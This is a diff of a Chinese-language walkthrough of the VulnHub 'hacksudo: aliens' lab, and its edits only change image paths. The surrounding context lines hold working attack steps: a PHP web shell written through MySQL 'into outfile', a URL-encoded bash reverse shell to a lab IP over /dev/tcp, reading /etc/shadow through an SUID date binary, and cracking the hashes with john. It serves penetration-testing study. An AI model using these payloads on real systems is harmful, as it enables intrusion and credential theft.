@@ -10,13 +10,13 @@
 
 使用`arp-scan -l`或者`netdiscover -r 192.168.1.1/24`进行探索
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\1.jpg)
+![](./pic-aliens/1.jpg)
 
 # 信息收集
 
 ## 使用nmap扫描
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\2.jpg)
+![](./pic-aliens/2.jpg)
 
 两个`http`服务，一个`ssh`服务
 
@@ -26,15 +26,15 @@
 
 访问80端口
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\3.jpg)
+![](./pic-aliens/3.jpg)
 
 查看页面源代码，可以发现一个作者的人名`vishal waghmare`
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\3-1.jpg)
+![](./pic-aliens/3-1.jpg)
 
 访问9000端口，发现是`phpmyadmin`的管理界面，也就是数据库的一种管理工具
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\4.jpg)
+![](./pic-aliens/4.jpg)
 
 ### 目录扫描
 
@@ -42,31 +42,31 @@
 
 使用`dirsearch、gobuster、ffuf、dirb、dirbuster`等工具
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\5.jpg)
+![](./pic-aliens/5.jpg)
 
 使用`dirsearch`扫描，多出一个`README.md`文件，访问，应该是模板
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\6.jpg)
+![](./pic-aliens/6.jpg)
 
 访问`backup`，发现数据库的备份文件
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\7.jpg)
+![](./pic-aliens/7.jpg)
 
 点击下载后进行查看，这个信息可能有用，等会测试
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\8.jpg)
+![](./pic-aliens/8.jpg)
 
 打开图片目录，有一张图片，不只有无用处，先记住
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\9.jpg)
+![](./pic-aliens/9.jpg)
 
 尝试扫描`9000`端口，发现挺多
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\10.jpg)
+![](./pic-aliens/10.jpg)
 
 不过这里先看一个，记住其版本
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\11.jpg)
+![](./pic-aliens/11.jpg)
 
 # 漏洞寻找
 
@@ -74,21 +74,21 @@
 
 用户名`vishal`，密码`hcaksudo`
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\12.jpg)
+![](./pic-aliens/12.jpg)
 
 点击用户账户，可以看到当前用户的一些相关设置
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\13.jpg)
+![](./pic-aliens/13.jpg)
 
 虽说`vishal`的权限与其他差不多，但是还是需要收集，因为这里的`hacksudo`数据库中，没有任何数据，可能对该用户没有放开。查看其他用户的密码
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\14.jpg)
+![](./pic-aliens/14.jpg)
 
 这里发现`root`的密码与`vishal`一样，但是登录`root`发现，数据库中依然没有数据
 
 解密其他用户密码，不过这里学到了这种类型的密码，是`mysql5`类型
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\15.jpg)
+![](./pic-aliens/15.jpg)
 
 以`hacksudo`和`shovon`用户登录还是没有数据，不过收集到几个连接到数据库的用户名和密码
 
@@ -102,7 +102,7 @@
 
 尝试把上面的数据写入一个`word.txt`中，然后使用`hydra`尝试爆破`ssh`，并没有发现任何东西
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\16.jpg)
+![](./pic-aliens/16.jpg)
 
 尝试使用`searchsploit`搜索有无漏洞可复现，发现并无对应的版本
 
@@ -110,11 +110,11 @@
 
 看了之后发现，80端口压根没有加载完整，我真的服了，可能是因为在虚拟机环境的原因，加载不动，我这里在物理机的浏览器访问
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\17.jpg)
+![](./pic-aliens/17.jpg)
 
 但是这里物理机访问也是很慢，估计资源加载的应该很多，猜测可能存在大量的`js`或其他的资源加载，所以目录扫描重新设置
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\18.jpg)
+![](./pic-aliens/18.jpg)
 
 
 
@@ -122,11 +122,11 @@
 
 不过访问后还是不能有其他操作，啧，突然想到之前在`phpmyadmin`中看到有几个用户是具有写权限的
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\19.jpg)
+![](./pic-aliens/19.jpg)
 
 并且在`backup`下载的`mysql.bak`中是有目录泄露的，之前截图未截取，这属于后半段的内容
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\20.jpg)
+![](./pic-aliens/20.jpg)
 
 # 漏洞利用
 
@@ -134,7 +134,7 @@
 
 这里查看`mysql`数据库版本
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\21.jpg)
+![](./pic-aliens/21.jpg)
 
 可以使用`outfile`
 
@@ -152,15 +152,15 @@ select "<?php system($_REQUEST['cmd']);?>" into outfile "/var/www/html/shell.php
 
 
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\22.jpg)
+![](./pic-aliens/22.jpg)
 
 使用浏览器访问进行测试
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\23.jpg)
+![](./pic-aliens/23.jpg)
 
 查看有无`nc`命令
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\24.jpg)
+![](./pic-aliens/24.jpg)
 
 构造`bash`反弹
 
@@ -172,7 +172,7 @@ bash+-c+%27bash+-i+%3e%26+%2fdev%2ftcp%2f192.168.1.16%2f9999+0%3e%261%27%0a
 
 首先在`kali`中开启`nc`监听9999端口，然后浏览器执行
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\25.jpg)
+![](./pic-aliens/25.jpg)
 
 
 
@@ -182,47 +182,47 @@ bash+-c+%27bash+-i+%3e%26+%2fdev%2ftcp%2f192.168.1.16%2f9999+0%3e%261%27%0a
 
 使用`find`寻找具有SUID的文件
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\26.jpg)
+![](./pic-aliens/26.jpg)
 
 刚开始发现有`sudo`，但是当前用户，无法使用，再看有`date`，之前没碰到，查看帮助文档
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\27.jpg)
+![](./pic-aliens/27.jpg)
 
 可以查看文件一次，并且还是具有`SUID`的。这么看可能不清晰，访问一个网站查看`gtfobins.github.io`
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\28.jpg)
+![](./pic-aliens/28.jpg)
 
 查看`/etc/shadow`文件
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\29.jpg)
+![](./pic-aliens/29.jpg)
 
 后面还有`hacksudo`的，太长，就没截图
 
 那么就可以把相关的有密码的复制到`kali`的一个文件中，然后查看`/etc/passwd`，把相关的复制到`kaili`的另一个文件中，然后使用`unshadow`整合到一起，使用`john`进行破解
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\30.jpg)
+![](./pic-aliens/30.jpg)
 
 这里先爆出，就先登录测试
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\31.jpg)
+![](./pic-aliens/31.jpg)
 
 
 
 寻找具有SUID的文件，虽然有sudo，但是还是无法使用
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\32.jpg)
+![](./pic-aliens/32.jpg)
 
 查看第一个，发现该文件是可执行文件
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\33.jpg)
+![](./pic-aliens/33.jpg)
 
 直接在网站搜索，看有无可用`gtfobins.github.io`
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\34.jpg)
+![](./pic-aliens/34.jpg)
 
 执行命令，注意，是执行当前目录下的这个命令
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\35.jpg)
+![](./pic-aliens/35.jpg)
 
 
 
@@ -234,7 +234,7 @@ bash+-c+%27bash+-i+%3e%26+%2fdev%2ftcp%2f192.168.1.16%2f9999+0%3e%261%27%0a
 
 删除`/var/www/html/shell.php`脚本
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-aliens\37.jpg)
+![](./pic-aliens/37.jpg)
 
 # 总结
 
